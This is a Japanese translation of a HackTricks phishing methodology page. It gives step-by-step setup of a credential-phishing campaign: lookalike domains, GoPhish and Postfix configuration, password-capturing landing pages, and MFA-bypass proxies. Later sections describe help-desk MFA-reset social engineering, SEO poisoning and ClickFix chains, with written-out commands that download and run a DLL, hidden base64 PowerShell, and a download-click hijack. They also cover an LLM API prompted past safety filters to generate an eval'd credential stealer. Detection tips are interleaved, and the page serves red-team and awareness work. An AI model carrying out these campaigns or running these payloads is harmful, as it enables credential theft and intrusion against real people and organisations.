# Phishing Methodology

{{#include ../../banners/hacktricks-training.md}}

## Methodology

1. 被害者を調査する
   1. **被害者のドメイン**を選択する。
   2. 基本的なWeb列挙を行い、被害者が使用している**ログインポータルを検索**して、どれを**偽装する**か**決める**。
   3. **OSINT**を使って**メールアドレスを見つける**。
2. 環境を準備する
   1. フィッシング評価に使用する**ドメインを購入**する
   2. メールサービス関連のレコード（SPF、DMARC、DKIM、rDNS）を**設定する**
   3. VPSに**gophish**を設定する
3. キャンペーンを準備する
   1. **メールテンプレート**を準備する
   2. 認証情報を盗むための**Webページ**を準備する
4. キャンペーンを開始する！

## 類似ドメイン名を生成するか、信頼できるドメインを購入する

### ドメイン名のバリエーション手法

- **キーワード**: ドメイン名に、元のドメインの重要な**キーワードが含まれる**（例: zelster.com-management.com）。<sup>[[1]](#references)</sup>
- **ハイフン付きサブドメイン**: サブドメインの**ドットをハイフンに変更する**（例: www-zelster.com）。
- **新しいTLD**: 同じドメインで**新しいTLDを使用する**（例: zelster.org）
- **Homoglyph**: ドメイン名の文字を、**見た目が似ている文字に置き換える**（例: zelfser.com）。

{{#ref}}
homograph-attacks.md
{{#endref}}
- **文字の入れ替え:** ドメイン名内の**2文字を入れ替える**（例: zelsetr.com）。
- **単数形化/複数形化**: ドメイン名の末尾に「s」を追加または削除する（例: zeltsers.com）。
- **文字の省略**: ドメイン名から文字を**1つ削除する**（例: zelser.com）。
- **文字の繰り返し:** ドメイン名の文字を**1つ繰り返す**（例: zeltsser.com）。
- **置換**: Homoglyphと似ているが、より検知されやすい。ドメイン名の文字を1つ置き換える。たとえば、キーボード上で元の文字の近くにある文字に置き換える（例: zektser.com）。
- **サブドメイン化**: ドメイン名の途中に**ドット**を入れる（例: ze.lster.com）。
- **文字の挿入**: ドメイン名に**文字を1つ挿入する**（例: zerltser.com）。
- **ドットの欠落**: TLDをドメイン名の末尾に付け加える（例: zelstercom.com）

**自動ツール**

- [**dnstwist**](https://github.com/elceef/dnstwist)
- [**urlcrazy**](https://github.com/urbanadventurer/urlcrazy)

**Webサイト**

- [https://dnstwist.it/](https://dnstwist.it)
- [https://dnstwister.report/](https://dnstwister.report)
- [https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/](https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/)

### Bitflipping

太陽フレア、宇宙線、ハードウェアエラーなどのさまざまな要因により、保存中または通信中のビットが自動的に反転する可能性があります。

この概念を**DNSリクエストに適用すると**、**DNSサーバーが受け取るドメイン**が、最初に要求されたドメインと異なる場合があります。

たとえば、ドメイン「windows.com」のビットが1つ変更されると、「windnws.com」に変わる可能性があります。

攻撃者は、被害者のドメインに似た複数のbit-flippingドメインを登録して、これを**悪用する**可能性があります。その目的は、正規のユーザーを自分たちのインフラにリダイレクトすることです。

詳細については、[https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/)を参照してください。<sup>[[10]](#references)[[11]](#references)</sup>

### 信頼できるドメインを購入する

[https://www.expireddomains.net/](https://www.expireddomains.net)で、使用できる期限切れドメインを検索できます。\
購入する期限切れドメインの**SEO評価がすでに高いことを確認する**には、次のサイトでどのように分類されているかを検索できます。

- [http://www.fortiguard.com/webfilter](http://www.fortiguard.com/webfilter)
- [https://urlfiltering.paloaltonetworks.com/query/](https://urlfiltering.paloaltonetworks.com/query/)

## メールアドレスの発見

- [https://github.com/laramies/theHarvester](https://github.com/laramies/theHarvester) (100%無料)
- [https://phonebook.cz/](https://phonebook.cz) (100%無料)
- [https://maildb.io/](https://maildb.io)
- [https://hunter.io/](https://hunter.io)
- [https://anymailfinder.com/](https://anymailfinder.com)

有効なメールアドレスをさらに**見つける**、またはすでに見つけたアドレスを**検証する**には、被害者のSMTPサーバーに対してブルートフォースできるか確認してください。[メールアドレスの検証/発見方法はこちら](../../network-services-pentesting/pentesting-smtp/index.html#username-bruteforce-enumeration)。\
さらに、ユーザーがメールにアクセスするために**何らかのWebポータルを使用している場合**、**ユーザー名のブルートフォース**に対して脆弱かどうかを確認し、可能であればその脆弱性を悪用することも忘れないでください。

## GoPhishの設定

### インストール

[https://github.com/gophish/gophish/releases/tag/v0.11.0](https://github.com/gophish/gophish/releases/tag/v0.11.0)からダウンロードできます。

`/opt/gophish`内にダウンロードして展開し、`/opt/gophish/gophish`を実行します。\
出力に、ポート3333のadminユーザー用パスワードが表示されます。そのため、そのポートにアクセスして、表示された認証情報を使用しadminパスワードを変更してください。そのポートをローカルにトンネルする必要がある場合があります。

```bash
ssh -L 3333:127.0.0.1:3333 <user>@<ip>
```

### 設定

**TLS 証明書の設定**

この手順を始める前に、使用する**ドメインを購入済み**で、そのドメインが **gophish** を設定している **VPS の IP アドレスを指している**必要があります。

```bash
DOMAIN="<domain>"
wget https://dl.eff.org/certbot-auto
chmod +x certbot-auto
sudo apt install snapd
sudo snap install core
sudo snap refresh core
sudo apt-get remove certbot
sudo snap install --classic certbot
sudo ln -s /snap/bin/certbot /usr/bin/certbot
certbot certonly --standalone -d "$DOMAIN"
mkdir /opt/gophish/ssl_keys
cp "/etc/letsencrypt/live/$DOMAIN/privkey.pem" /opt/gophish/ssl_keys/key.pem
cp "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" /opt/gophish/ssl_keys/key.crt​
```

**メールの設定**

インストールを開始します: `apt-get install postfix`

次のファイルにドメインを追加します:

- **/etc/postfix/virtual_domains**
- **/etc/postfix/transport**
- **/etc/postfix/virtual_regexp**

**/etc/postfix/main.cf** 内の次の変数の値も変更します

`myhostname = <domain>`\
`mydestination = $myhostname, <domain>, localhost.com, localhost`

最後に、**`/etc/hostname`** と **`/etc/mailname`** の内容をドメイン名に変更し、**VPSを再起動します。**

次に、VPSの**IPアドレス**を指す `mail.<domain>` の **DNS Aレコード**と、`mail.<domain>` を指す **DNS MXレコード**を作成します。

では、メールを送信してみましょう:

```bash
apt install mailutils
echo "This is the body of the email" | mail -s "This is the subject line" test@email.com
```

**Gophish configuration**

gophishの実行を停止して、設定しましょう。\
`/opt/gophish/config.json`を以下のように変更します（httpsの使用に注意してください）。

```bash
{
        "admin_server": {
                "listen_url": "127.0.0.1:3333",
                "use_tls": true,
                "cert_path": "gophish_admin.crt",
                "key_path": "gophish_admin.key"
        },
        "phish_server": {
                "listen_url": "0.0.0.0:443",
                "use_tls": true,
                "cert_path": "/opt/gophish/ssl_keys/key.crt",
                "key_path": "/opt/gophish/ssl_keys/key.pem"
        },
        "db_name": "sqlite3",
        "db_path": "gophish.db",
        "migrations_prefix": "db/db_",
        "contact_address": "",
        "logging": {
                "filename": "",
                "level": ""
        }
}
```

**gophish サービスを設定する**

gophish サービスを作成して自動起動できるようにし、サービスとして管理するには、次の内容で `/etc/init.d/gophish` ファイルを作成します。

```bash
#!/bin/bash
# /etc/init.d/gophish
# initialization file for stop/start of gophish application server
#
# chkconfig: - 64 36
# description: stops/starts gophish application server
# processname:gophish
# config:/opt/gophish/config.json
# From https://github.com/gophish/gophish/issues/586

# define script variables

processName=Gophish
process=gophish
appDirectory=/opt/gophish
logfile=/var/log/gophish/gophish.log
errfile=/var/log/gophish/gophish.error

start() {
    echo 'Starting '${processName}'...'
    cd ${appDirectory}
    nohup ./$process >>$logfile 2>>$errfile &
    sleep 1
}

stop() {
    echo 'Stopping '${processName}'...'
    pid=$(/bin/pidof ${process})
    kill ${pid}
    sleep 1
}

status() {
    pid=$(/bin/pidof ${process})
    if [["$pid" != ""| "$pid" != "" ]]; then
        echo ${processName}' is running...'
    else
        echo ${processName}' is not running...'
    fi
}

case $1 in
    start|stop|status) "$1" ;;
esac
```

以下を行ってサービスの設定を完了し、動作を確認します:

```bash
mkdir /var/log/gophish
chmod +x /etc/init.d/gophish
update-rc.d gophish defaults
#Check the service
service gophish start
service gophish status
ss -l | grep "3333\|443"
service gophish stop
```

## メールサーバーとドメインの設定

### 待機して正規の状態にする

ドメインの登録期間が長いほど、スパムとして検出される可能性は低くなります。そのため、フィッシング評価を行う前に、できるだけ長く（少なくとも1週間）待つ必要があります。さらに、評判の良い業界に関するページを設置すると、より良い評判を得られます。

1週間待つ必要がある場合でも、今すぐすべての設定を終えられることに注意してください。

### Reverse DNS（rDNS）レコードの設定

VPSのIPアドレスがドメイン名に解決されるよう、rDNS（PTR）レコードを設定します。

### Sender Policy Framework（SPF）レコード

**新しいドメインにSPFレコードを設定する必要があります**。SPFレコードとは何か分からない場合は、[**このページを読んでください**](../../network-services-pentesting/pentesting-smtp/index.html#spf)。

[https://www.spfwizard.net/](https://www.spfwizard.net)を使ってSPFポリシーを生成できます（VPSマシンのIPを使用してください）。

![フィッシングドメインのSPFレコードを生成するためのSPF Wizardフォーム](<../../images/image (1037).png>)

ドメイン内のTXTレコードに設定する内容は次のとおりです：

```bash
v=spf1 mx a ip4:ip.ip.ip.ip ?all
```

### Domain-based Message Authentication, Reporting & Conformance (DMARC) レコード

**新しいドメインにDMARCレコードを設定する必要があります**。DMARCレコードについてわからない場合は、[**このページをお読みください**](../../network-services-pentesting/pentesting-smtp/index.html#dmarc)。

ホスト名 `_dmarc.<domain>` を指定し、次の内容を設定した新しいDNS TXTレコードを作成してください：

```bash
v=DMARC1; p=none
```

### DomainKeys Identified Mail (DKIM)

新しいドメイン用に**DKIMを設定する必要があります**。DKIMレコードが何か分からない場合は、[**こちらのページをお読みください**](../../network-services-pentesting/pentesting-smtp/index.html#dkim)。

このチュートリアルは次の記事に基づいています: [https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)。<sup>[[5]](#references)</sup>

> [!TIP]
> DKIMキーの生成する両方のB64値を連結する必要があります:
>
> ```
> v=DKIM1; h=sha256; k=rsa; p=MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0wPibdqPtzYk81njjQCrChIcHzxOp8a1wjbsoNtka2X9QXCZs+iXkvw++QsWDtdYu3q0Ofnr0Yd/TmG/Y2bBGoEgeE+YTUG2aEgw8Xx42NLJq2D1pB2lRQPW4IxefROnXu5HfKSm7dyzML1gZ1U0pR5X4IZCH0wOPhIq326QjxJZm79E1nTh3xj" "Y9N/Dt3+fVnIbMupzXE216TdFuifKM6Tl6O/axNsbswMS1TH812euno8xRpsdXJzFlB9q3VbMkVWig4P538mHolGzudEBg563vv66U8D7uuzGYxYT4WS8NVm3QBMg0QKPWZaKp+bADLkOSB9J2nUpk4Aj9KB5swIDAQAB
> ```

### メール設定のスコアをテストする

[https://www.mail-tester.com/](https://www.mail-tester.com) を使ってテストできます\
ページにアクセスして、表示されたアドレスにメールを送信してください。

```bash
echo "This is the body of the email" | mail -s "This is the subject line" test-iimosa79z@srv1.mail-tester.com
```

メールを `check-auth@verifier.port25.com` に送信して**メールの設定を確認**し、**返信を読む**こともできます（そのためにはポート **25** を開き、root としてメールを送信した場合はファイル _/var/mail/root_ で返信を確認する必要があります）。\
すべてのテストに合格していることを確認してください。

```bash
==========================================================
Summary of Results
==========================================================
SPF check:          pass
DomainKeys check:   neutral
DKIM check:         pass
Sender-ID check:    pass
SpamAssassin check: ham
```

**自分が管理している Gmail アカウントにメッセージを送信**し、Gmail の受信トレイで**メールのヘッダー**を確認する方法もあります。`Authentication-Results` ヘッダーフィールドに `dkim=pass` が含まれているはずです。

```
Authentication-Results: mx.google.com;
       spf=pass (google.com: domain of contact@example.com designates --- as permitted sender) smtp.mail=contact@example.com;
       dkim=pass header.i=@example.com;
```

### ​Spamhouseブラックリストからの削除

[www.mail-tester.com](https://www.mail-tester.com) で、あなたのドメインが spamhouse によってブロックされているか確認できます。ドメイン/IP の削除は、こちらから申請できます: ​[https://www.spamhaus.org/lookup/](https://www.spamhaus.org/lookup/)

### Microsoftブラックリストからの削除

​​ドメイン/IP の削除は、[https://sender.office.com/](https://sender.office.com) から申請できます。

## GoPhishキャンペーンの作成と開始

### 送信プロファイル

- 送信プロファイルを識別するための**名前**を設定します
- フィッシングメールの送信元アカウントを決めます。候補: _noreply, support, servicedesk, salesforce..._
- ユーザー名とパスワードは空欄のままでも構いませんが、必ず「Ignore Certificate Errors」にチェックを入れてください

![Create & Launch GoPhish Campaign - Sending Profile: You can leave blank the username and password, but make sure to check the Ignore Certificate Errors](<../../images/image (253) (1) (2) (1) (1) (2) (2) (3) (3) (5) (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (10) (15) (2).png>)

> [!TIP]
> すべてが正常に動作するか確認するため、「**Send Test Email**」機能を使ってテストすることをおすすめします。\
> テストによるブラックリスト登録を避けるため、**テストメールは10分メールアドレスに送信する**ことをおすすめします。

### メールテンプレート

- テンプレートを識別するための**名前**を設定します
- 次に**件名**を入力します（不自然なものではなく、通常のメールで受信しそうなものにします）
- 「**Add Tracking Image**」にチェックが入っていることを確認します
- **メールテンプレート**を作成します（次の例のように変数を使用できます）:

```html
<html>
<head>
    <title></title>
</head>
<body>
<p class="MsoNormal"><span style="font-size:10.0pt;font-family:&quot;Verdana&quot;,sans-serif;color:black">Dear {{.FirstName}} {{.LastName}},</span></p>
<br />
Note: We require all user to login an a very suspicios page before the end of the week, thanks!<br />
<br />
Regards,</span></p>

WRITE HERE SOME SIGNATURE OF SOMEONE FROM THE COMPANY

<p>{{.Tracker}}</p>
</body>
</html>
```

なお、**メールの信頼性を高めるために**、クライアントからのメールに含まれる署名を使うことをおすすめします。以下の方法を試してください。

- **存在しないアドレス**にメールを送り、返信に署名が含まれているか確認する。
- info@ex.com、press@ex.com、public@ex.com などの**公開メールアドレス**を探してメールを送り、返信を待つ。
- 発見した**有効なメールアドレス**に連絡し、返信を待つ。

![送信プロファイル - メールテンプレート: 発見した有効なメールアドレスに連絡し、返信を待つ](<../../images/image (80).png>)

> [!TIP]
> メールテンプレートでは、**送信するファイルを添付**することもできます。細工したファイルやドキュメントを使ってNTLM challengeも盗みたい場合は、[このページを読んでください](../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md)。

### ランディングページ

- **名前**を入力する
- Webページの**HTMLコードを入力**する。Webページを**インポート**することもできます。
- **Capture Submitted Data** と **Capture Passwords** にチェックを入れる
- **リダイレクト**を設定する

![メールテンプレート - ランディングページ: Capture Submitted Data と Capture Passwords にチェックを入れる](<../../images/image (826).png>)

> [!TIP]
> 通常は、ページのHTMLコードを修正し、結果に**満足するまで**ローカル環境（Apacheサーバーなどを使用）でテストする必要があります。その後、そのHTMLコードをボックスに入力してください。\
> HTMLで**静的リソース**（CSSやJSのページなど）を使う必要がある場合は、_**/opt/gophish/static/endpoint**_ に保存し、_**/static/\<filename>**_ からアクセスできます。

> [!TIP]
> リダイレクト先には、被害者の正規のメインWebページを指定するか、たとえば _/static/migration.html_ にリダイレクトできます。**スピニングホイール** ([**https://loading.io/**](https://loading.io)) を5秒間表示し、その後、プロセスが成功したことを伝える方法もあります。

### ユーザーとグループ

- 名前を設定する
- **データをインポート**する（例のテンプレートを使用するには、各ユーザーの名、姓、メールアドレスが必要です）

![ランディングページ - ユーザーとグループ: データをインポートする（例のテンプレートを使用するには、各ユーザーの名、姓、メールアドレスが必要です）](<../../images/image (163).png>)

### キャンペーン

最後に、名前、メールテンプレート、ランディングページ、URL、送信プロファイル、グループを選択してキャンペーンを作成します。URLは被害者に送信するリンクです。

**送信プロファイルでは、テストメールを送信して、最終的なフィッシングメールがどのように見えるか確認できます**。

![ユーザーとグループ - キャンペーン: 送信プロファイルでは、テストメールを送信して、最終的なフィッシングメールがどのように見えるか確認できます](<../../images/image (192).png>)

準備が整ったら、キャンペーンを開始しましょう！

## Webサイトのクローン作成

何らかの理由でWebサイトをクローンしたい場合は、次のページを確認してください。


{{#ref}}
clone-a-website.md
{{#endref}}

## バックドア付きドキュメントとファイル

一部のフィッシング評価（主にRed Team向け）では、**何らかのバックドアを含むファイル**（C2や、認証を発生させるだけのものなど）も**送信したい**場合があります。\
例については、次のページを確認してください。


{{#ref}}
phishing-documents.md
{{#endref}}

## MFAフィッシング

### Proxy MitM経由

前述の攻撃は、本物のWebサイトを偽装し、ユーザーが入力した情報を収集する巧妙なものです。しかし、ユーザーが正しいパスワードを入力しなかった場合や、偽装したアプリケーションで2FAが設定されている場合、**この情報だけでは、だまされたユーザーになりすますことはできません**。

ここで、[**evilginx2**](https://github.com/kgretzky/evilginx2)**、**[**CredSniper**](https://github.com/ustayready/CredSniper)、[**muraena**](https://github.com/muraenateam/muraena) などのツールが役立ちます。これらのツールを使うと、MitMのような攻撃を実行できます。基本的な攻撃の流れは次のとおりです。

1. 本物のWebページのログインフォームに**なりすます**。
2. ユーザーが偽のページに**認証情報を送信**すると、ツールがそれを本物のWebページに転送し、**認証情報が有効かどうか確認**する。
3. アカウントに**2FA**が設定されている場合、MitMページで入力を求める。**ユーザーが入力**すると、ツールが本物のWebページに転送する。
4. ユーザーが認証されると、ツールがMitMを実行している間のやり取りから、攻撃者は**認証情報、2FA、cookie、その他の情報**を取得できる。

### VNC経由

**被害者を本物と同じ見た目の悪意あるページに誘導する**代わりに、**本物のWebページに接続したブラウザーが動作するVNCセッション**に誘導したらどうでしょうか。被害者の操作を見て、パスワード、使用されたMFA、cookieなどを盗むことができます。\
[**EvilnVNC**](https://github.com/JoelGMSec/EvilnoVNC) を使えば実現できます。<sup>[[3]](#references)[[4]](#references)</sup>

## 検知されているかを検知する

当然ながら、検知されたかどうかを知る最善の方法の1つは、**ブラックリストで自分のドメインを検索すること**です。リストに載っていれば、何らかの形でそのドメインが不審だと判定されています。\
ドメインがブラックリストに載っているかを簡単に確認するには、[https://malwareworld.com/](https://malwareworld.com) を利用できます。

ただし、被害者が**実際にフィッシング活動を探しているかどうか**を知る方法は、他にもあります。詳しくは、次のページで説明されています。


{{#ref}}
detecting-phising.md
{{#endref}}

被害者のドメインとよく似た名前のドメインを**購入する**、および／または、自分が管理するドメインの**サブドメイン**に被害者のドメインの**キーワードを含めた**証明書を**生成する**ことができます。被害者がそれらに対して何らかの**DNSまたはHTTP通信**を行った場合、不審なドメインを積極的に探していると判断できるため、非常にステルス性を高める必要があります。<sup>[[2]](#references)</sup>

### フィッシングの評価

[**Phishious**](https://github.com/Rices/Phishious) を使って、メールが迷惑メールフォルダーに入るか、ブロックされるか、正常に届くかを評価してください。

## ハイタッチ型ID侵害（ヘルプデスクによるMFAリセット）

近年の侵入グループは、メールによる誘導を完全に省略し、MFAを無効化するために**サービスデスク／ID回復のワークフローを直接標的にする**ことが増えています。この攻撃は完全に「living-off-the-land」で行われます。有効な認証情報を取得すると、オペレーターは組み込みの管理ツールで侵入を拡大するため、マルウェアは必要ありません。<sup>[[6]](#references)</sup>

### 攻撃の流れ
1. 被害者を偵察する
   * LinkedIn、データ侵害、公開GitHubなどから個人情報や企業情報を収集する。
   * 重要度の高いID（経営幹部、IT、財務）を特定し、パスワード／MFAリセットに関する**正確なヘルプデスクの手順**を調べる。
2. リアルタイムのソーシャルエンジニアリング
   * 標的になりすまし、電話、Teams、チャットでヘルプデスクに連絡する（多くの場合、**発信者番号の偽装**や**声のクローン**を使用）。
   * 事前に収集したPIIを提示し、知識ベース認証を通過する。
   * 担当者を説得して、**MFAシークレットをリセット**させるか、登録済みの携帯電話番号で**SIMスワップ**を行わせる。
3. アクセス直後の操作（実際の事例では60分以内）
   * Web SSOポータルを通じて足場を確保する。
   * バイナリを配置せず、組み込みツールでAD／AzureADを列挙する。
     ```powershell
     # list directory groups & privileged roles
     Get-ADGroup -Filter * -Properties Members | ?{$_.Members -match $env:USERNAME}

     # AzureAD / Graph – list directory roles
     Get-MgDirectoryRole | ft DisplayName,Id

     # Enumerate devices the account can login to
     Get-MgUserRegisteredDevice -UserId <user@corp.local>
     ```
   * 環境内ですでに許可リストに登録されている **WMI**、**PsExec**、または正規の **RMM** エージェントを使った lateral movement。

### 検知と緩和策
* ヘルプデスクによる ID 回復を**特権操作**として扱い、追加認証とマネージャーの承認を必須にする。
* **Identity Threat Detection & Response (ITDR)** / **UEBA** ルールを導入し、次の事象をアラートする。  
  * MFA 方式の変更後、新しいデバイスまたは地域から認証が行われた。
  * 同一のプリンシパルが直後に権限昇格された（user-→-admin）。
* ヘルプデスクへの通話を録音し、リセット前に**登録済みの電話番号への折り返し確認**を必須にする。
* **Just-In-Time (JIT) / Privileged Access** を導入し、リセット直後のアカウントが高権限のトークンを自動的に継承しないようにする。

---

## 大規模な偽装 – SEO Poisoning と「ClickFix」キャンペーン
一般的な攻撃グループは、**検索エンジンと広告ネットワークを配信経路にする**大規模攻撃で、手間のかかる攻撃のコストを相殺します。<sup>[[6]](#references)</sup>

1. **SEO poisoning / malvertising** により、`chromium-update[.]site` のような偽の検索結果を検索広告の最上位に表示させる。
2. 被害者が小さな**第一段階の loader**（多くの場合、JS/HTA/ISO）をダウンロードする。Unit 42 が確認した例：
   * `RedLine stealer`
   * `Lumma stealer`
   * `Lampion Trojan`
3. Loader はブラウザーの cookie と認証情報 DB を外部へ送信し、その後、*リアルタイムで*次のいずれを展開するか判断する**サイレント loader**を取得する。
   * RAT（例：AsyncRAT、RustDesk）
   * ransomware / wiper
   * 永続化コンポーネント（レジストリの Run キー + scheduled task）

### 強化のヒント
* 新規登録ドメインをブロックし、メールだけでなく*検索広告*にも **Advanced DNS / URL Filtering** を適用する。
* ソフトウェアのインストールを署名済み MSI / Store パッケージに制限し、ポリシーで `HTA`、`ISO`、`VBS` の実行を拒否する。
* ブラウザーの子プロセスがインストーラーを起動していないか監視する。
  ```yaml
  - parent_image: /Program Files/Google/Chrome/*
    and child_image: *\\*.exe
  ```
* first-stage loader によく悪用される LOLBins（例: `regsvr32`、`curl`、`mshta`）を探します。

### TDS への引き渡しを伴うダウンロードボタンのクリック乗っ取り
偽のソフトウェア配布サイトの中には、表示上のダウンロード `href` は**本物の** GitHub/release URL を指したまま、JavaScript でユーザーの**最初の**操作を乗っ取り、被害者を代わりに **Traffic Distribution System (TDS)** のチェーンへ誘導するものがあります。<sup>[[9]](#references)</sup>

```javascript
const cachedOpen = window.open;
document.addEventListener(isChromeDesktop() ? "mousedown" : "click", (e) => {
  if (!isEligibleClick(e.target)) return;
  cachedOpen(generateRuntimeURL({referrer: location.href, userDestination: extractClickedLink(e.target)}));
  e.stopImmediatePropagation();
  e.preventDefault();
}, true);
```

主な特徴:
- フックは通常、`document` の **capture phase**（`true`）で実行されるため、サイトのハンドラーより先に発火する。
- Chrome では、リダイレクトを有効な **user gesture** に紐付け、ポップアップブロッカーの回避を容易にするため、`click` ではなく `mousedown` がよく使われる。
- 一部の亜種は `about:blank` を先に開くか、`<a target="_blank">` のクリックを合成し、後から TDS URL を割り当てる。
- ブラウザー側の上限は一般に `localStorage` に保存されるため、**最初のクリック**ではマルウェアに到達し、再読み込みや再試行では無害に見える表示リンクにフォールバックする場合がある。
- TDS は、リファラー、流入元ドメイン、GEO、ブラウザー／デバイスのフィンガープリント、VPN／データセンターのチェック、クリック時の状況、セッションごとのカウンターで条件分岐できるため、アナリストによる再現結果は一定しない。

防御側のヒント:
- **表示されている** `href` と、クリック時に生成される **実際の** 遷移先を比較する。
- `window.open`、`about:blank`、合成アンカークリックの周辺で `preventDefault()` と `stopImmediatePropagation()` の両方を呼び出す `document.addEventListener(..., true)` ハンドラーを探す。
- 新たに登録されたソフトウェアダウンロード用ドメインのクラスターが、すべて同じ CloudFront/JS ステージを読み込む場合、SEOポイズニング/TDS の高確度パターンとして扱う。

### 偽の検証ページを使った ClickFix + アーカイブに見せかけた LOLBAS のダウンロード
一部の TDS 分岐は、被害者に次のような信頼された Windows バイナリを実行するよう指示する偽の検証ページ（Cloudflare/IUAM 形式）に誘導する:<sup>[[9]](#references)</sup>

```cmd
C:\Windows\SysWOW64\mshta.exe https://example[.]com/navy.7z
```

Notes:
- `mshta.exe` は、URL が `.7z` アーカイブを装っていても、レスポンスの先頭にある **HTA/VBScript を実行**します。後ろに追加されたアーカイブデータは、完全なデコイの場合があります。
- 後続ステージでは、ファイル形式についても偽装が続くことがよくあります（PowerShell を `.rtf`、Python を `.asar` と偽装したり、バイナリをパディングした ZIP を使ったりします）。その後、**手動の PE マッピング／メモリ内実行**に切り替わります。
- こうしたチェーンに対応する場合は、最初に成功した実行時から **ネットワークとメモリの両方を保全**してください。後の再実行では、無害なインストーラー／SFX の経路しか確認できなかったり、ペイロード／鍵のリリースが元の TDS セッションに紐づけられているために失敗したりすることがあります。

### ClickFix DLL 配信手法（偽 CERT 更新）
* 誘導方法: 国の CERT 勧告を複製し、手順ごとの「修正」方法を表示する **Update** ボタンを設置します。被害者には、DLL をダウンロードして `rundll32` 経由で実行するバッチを実行するよう指示します。<sup>[[12]](#references)</sup>
* 観測された典型的なバッチチェーン:
  ```cmd
  echo powershell -Command "Invoke-WebRequest -Uri 'https://example[.]org/notepad2.dll' -OutFile '%TEMP%\notepad2.dll'"
  echo timeout /t 10
  echo rundll32.exe "%TEMP%\notepad2.dll",notepad
  ```
  * `Invoke-WebRequest` は payload を `%TEMP%` に保存し、短い sleep で network jitter を隠した後、`rundll32` がエクスポートされたエントリポイント（`notepad`）を呼び出します。
* DLL はホストの識別情報を beacon で送信し、数分ごとに C2 をポーリングします。リモートからの tasking は **base64-encoded PowerShell** として届き、非表示かつ policy bypass で実行されます。
  ```powershell
  powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('<b64_task>')) | Invoke-Expression"
  ```
  * これにより、C2の柔軟性（サーバーがDLLを更新せずにタスクを切り替えられる）を維持し、コンソールウィンドウを非表示にできます。`-WindowStyle Hidden`、`FromBase64String`、`Invoke-Expression`をすべて組み合わせて使用する`rundll32.exe`の子プロセスであるPowerShellを探してください。
* 防御側は、`...page.php?tynor=<COMPUTER>sss<USER>`形式のHTTP(S)コールバックや、DLL読み込み後の5分間隔のポーリングを探せます。

---

## AIを活用したフィッシング活動
攻撃者は現在、**LLMと音声クローンAPI**を組み合わせ、完全にパーソナライズされた誘い文句とリアルタイムのやり取りを実現しています。

| レイヤー | 脅威アクターによる利用例 |
|-------|-----------------------------|
|自動化|ランダムな文面とトラッキングリンクを使って、10万件を超えるメールやSMSを生成・送信する。|
|生成AI|公開されているM&A情報やソーシャルメディア上の内輪ネタに言及する*一度限りの*メールを作成する。折り返し電話を使った詐欺では、CEOのディープフェイク音声を使用する。|
|Agentic AI|ドメインを自律的に登録し、オープンソースの情報を収集する。被害者がクリックしたものの認証情報を入力しなかった場合は、次の段階のメールを作成する。|

**防御策:**  
• 信頼できない自動化ツールから送信されたメッセージを強調表示する動的バナーを追加する（ARC/DKIMの異常を利用）。  
• リスクの高い電話での依頼には、音声生体認証のチャレンジフレーズを導入する。  
• セキュリティ意識向上プログラムで、AIが生成した誘い文句を継続的にシミュレーションする。静的なテンプレートは時代遅れです。

認証情報フィッシングにおけるagentic browsingの悪用も参照してください。

{{#ref}}
ai-agent-mode-phishing-abusing-hosted-agent-browsers.md
{{#endref}}

シークレットのインベントリと検出を目的とした、ローカルCLIツールおよびMCPへのAI agentの悪用も参照してください。

{{#ref}}
ai-agent-abuse-local-ai-cli-tools-and-mcp.md
{{#endref}}

## LLMを利用したフィッシングJavaScriptの実行時生成（ブラウザー内コード生成）

攻撃者は一見無害なHTMLを送り込み、**信頼できるLLM API**にJavaScriptを要求して、実行時にstealerを生成し、ブラウザー内で実行できます（例: `eval`や動的な`<script>`）。<sup>[[8]](#references)</sup>

1. **Prompt-as-obfuscation:** プロンプトに情報流出先のURLやBase64文字列を埋め込み、安全フィルターを回避して幻覚を減らすために文面を調整する。
2. **クライアント側API呼び出し:** ページの読み込み時に、JavaScriptが公開LLM（Gemini/DeepSeekなど）またはCDNプロキシを呼び出す。静的HTMLに含まれるのはプロンプト/API呼び出しのみ。
3. **組み立てと実行:** 応答を連結して実行する（訪問ごとにポリモーフィックに変化）:

```javascript
fetch("https://llm.example/v1/chat",{method:"POST",body:JSON.stringify({messages:[{role:"user",content:promptText}]}),headers:{"Content-Type":"application/json",Authorization:`Bearer ${apiKey}`}})
  .then(r=>r.json())
  .then(j=>{const payload=j.choices?.[0]?.message?.content; eval(payload);});
```

4. **フィッシング/情報窃取:** 生成コードが誘導ページを個別化し（例: LogoKit のトークン解析）、認証情報をプロンプト内に隠されたエンドポイントに送信する。

**回避の特徴**
- 通信は、よく知られた LLM ドメインや信頼性の高い CDN プロキシを経由する。バックエンドとの通信に WebSockets が使われることもある。
- 静的なペイロードは存在せず、悪意のある JS はレンダリング後にのみ存在する。
- 生成結果が非決定的なため、セッションごとに**固有の**stealer が生成される。

**検知のアイデア**
- JS を有効にしたサンドボックスを実行し、LLM のレスポンスをソースとする実行時の `eval`/動的なスクリプト生成を検知する。
- LLM API へのフロントエンドからの POST の直後に、返されたテキストに対する `eval`/`Function` が実行されていないか調査する。
- 許可されていない LLM ドメインへのクライアント通信と、それに続く認証情報の POST をアラート対象にする。

---

## MFA Fatigue / Push Bombing Variant – 強制リセット
従来の push-bombing に加えて、攻撃者はヘルプデスクへの電話中に**新たな MFA 登録を強制**し、ユーザーの既存トークンを無効化することがある。その後のログインプロンプトは、被害者には正規のものに見える。

```text
[Attacker]  →  Help-Desk:  “I lost my phone while travelling, can you unenrol it so I can add a new authenticator?”
[Help-Desk] →  AzureAD: ‘Delete existing methods’ → sends registration e-mail
[Attacker]  →  Completes new TOTP enrolment on their own device
```

